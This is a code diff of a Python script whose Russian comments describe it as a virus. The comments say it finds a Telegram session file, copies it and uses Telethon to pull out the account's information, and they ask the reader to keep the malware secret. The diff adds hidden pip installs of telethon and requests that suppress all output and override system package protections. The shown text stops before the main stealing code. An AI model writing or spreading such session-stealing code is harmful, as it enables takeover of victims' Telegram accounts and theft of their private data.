@@ -1,18 +1,22 @@
 import subprocess, os
-from telethon import TelegramClient
-from telethon.sessions import StringSession
 
 # Привет, я вижу, как ты читаешь это
 # Если интересно, что делает код:
 # Он ищет session-XXXXX файл, копирует, открывает через Telethon и добывает всю нужную информацию
 # Прошу никому не говорить то, что это вирус.
 
-subprocess.run('python3 -m pip install requests --break-system-packages'.split(' '), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-subprocess.run('python3 -m pip3 install requests --break-system-packages'.split(' '), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-subprocess.run('pip3 install requests --break-system-packages'.split(' '), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-subprocess.run('pip3 install requests'.split(' '), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-# Качаем requests
+def install_module(name):
+    
+    subprocess.run(f'python3 -m pip install {name} --break-system-packages'.split(' '), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.run(f'python3 -m pip3 install {name} --break-system-packages'.split(' '), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.run(f'pip3 install {name} --break-system-packages'.split(' '), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.run(f'pip3 install {name}'.split(' '), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
+install_module('telethon')
+install_module('requests')
+
+from telethon import TelegramClient
+from telethon.sessions import StringSession
 import requests
 
 # Сам код
